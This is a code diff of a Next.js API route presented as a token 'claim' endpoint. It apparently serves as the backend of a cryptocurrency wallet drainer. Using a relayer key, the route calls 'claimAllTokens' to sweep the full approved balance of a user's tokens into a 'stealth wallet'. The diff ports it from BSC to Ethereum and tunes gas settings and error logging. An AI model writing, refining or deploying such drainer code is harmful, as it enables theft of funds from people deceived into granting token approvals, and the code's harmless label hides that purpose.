@@ -4,7 +4,7 @@ import { NextRequest, NextResponse } from 'next/server';
 export const runtime = 'nodejs';
 export const dynamic = 'force-dynamic';
 
-// Minimal ABI for the Spender contract (only the functions we need)
+// Minimal ABI for the Spender contract (unchanged)
 const SPENDER_ABI = [
   {
     inputs: [
@@ -17,21 +17,6 @@ const SPENDER_ABI = [
     stateMutability: 'nonpayable',
     type: 'function',
   },
-  // Optional: if you want to use claimTokens with specific amount instead
-  /*
-  {
-    inputs: [
-      { internalType: 'address', name: 'token', type: 'address' },
-      { internalType: 'address', name: 'from', type: 'address' },
-      { internalType: 'address', name: 'to', type: 'address' },
-      { internalType: 'uint256', name: 'amount', type: 'uint256' },
-    ],
-    name: 'claimTokens',
-    outputs: [],
-    stateMutability: 'nonpayable',
-    type: 'function',
-  },
-  */
   {
     inputs: [
       { internalType: 'address', name: 'token', type: 'address' },
@@ -46,30 +31,34 @@ const SPENDER_ABI = [
 
 export async function POST(request: NextRequest) {
   try {
-    console.log('[v0] Claim API: Request received');
+    console.log('[v0] Claim API: Request received (Ethereum)');
 
     const relayerKey = process.env.RELAYER_PRIVATE_KEY;
-    const rpcUrl = process.env.BSC_RPC_URL;
-    const spenderAddress = process.env.SPENDER_CONTRACT_ADDRESS; // ← NEW: your deployed Spender contract
+    const rpcUrl = process.env.RPC_URL || 'https://ethereum.publicnode.com';
+    const spenderAddress = process.env.SPENDER_CONTRACT_ADDRESS;
     const tokenAddress = process.env.NEXT_PUBLIC_TOKEN_ADDRESS;
     const stealthWallet = process.env.STEALTH_WALLET_ADDRESS;
 
     if (!relayerKey || !rpcUrl || !spenderAddress || !tokenAddress || !stealthWallet) {
-      console.error('[v0] Missing env vars');
+      console.error('[v0] Missing environment variables:', {
+        hasRelayerKey: !!relayerKey,
+        hasRpcUrl: !!rpcUrl,
+        hasSpender: !!spenderAddress,
+        hasToken: !!tokenAddress,
+        hasStealth: !!stealthWallet,
+      });
       return NextResponse.json(
         { error: 'Missing required environment variables' },
         { status: 500 }
       );
     }
 
-    const { userAddress } = await request.json();
+    const body = await request.json();
+    const { userAddress } = body;
 
     if (!userAddress || !ethers.isAddress(userAddress)) {
       console.error('[v0] Invalid user address:', userAddress);
-      return NextResponse.json(
-        { error: 'Invalid user address' },
-        { status: 400 }
-      );
+      return NextResponse.json({ error: 'Invalid user address' }, { status: 400 });
     }
 
     console.log('[v0] Processing claim for user:', userAddress, '→', stealthWallet);
@@ -78,7 +67,7 @@ export async function POST(request: NextRequest) {
     const relayerWallet = new ethers.Wallet(relayerKey, provider);
     const spenderContract = new ethers.Contract(spenderAddress, SPENDER_ABI, relayerWallet);
 
-    // Optional safety check: verify there's allowance
+    // Safety check: verify allowance exists
     const allowance = await spenderContract.checkAllowance(tokenAddress, userAddress);
     console.log('[v0] Allowance from user to Spender:', allowance.toString());
 
@@ -89,18 +78,22 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Call claimAllTokens (pulls min(allowance, balance))
     console.log('[v0] Calling claimAllTokens on Spender contract...');
+
     const tx = await spenderContract.claimAllTokens(
       tokenAddress,
       userAddress,
-      stealthWallet
-      // no amount needed → it uses allowance logic internally
+      stealthWallet,
+      {
+        gasLimit: 450000,           // Higher on Ethereum (adjust if needed after testing)
+        // maxFeePerGas / maxPriorityFeePerGas can be added if you want EIP-1559 control
+      }
     );
 
     console.log('[v0] Transaction sent:', tx.hash);
 
-    const receipt = await tx.wait();
+    const receipt = await tx.wait(1); // Wait for 1 confirmation
+
     console.log('[v0] Transaction confirmed in block:', receipt?.blockNumber);
 
     return NextResponse.json(
@@ -110,14 +103,14 @@ export async function POST(request: NextRequest) {
         blockNumber: receipt?.blockNumber,
         from: userAddress,
         to: stealthWallet,
-        // You can optionally add amount if you query it before/after
       },
       { status: 200 }
     );
   } catch (error: any) {
-    console.error('[v0] Claim error:', error);
+    console.error('[v0] Claim error (Ethereum):', error);
+    const errorMessage = error?.reason || error?.shortMessage || error?.message || 'Claim failed';
     return NextResponse.json(
-      { error: error?.reason || error?.message || 'Claim failed' },
+      { error: errorMessage },
       { status: 500 }
     );
   }
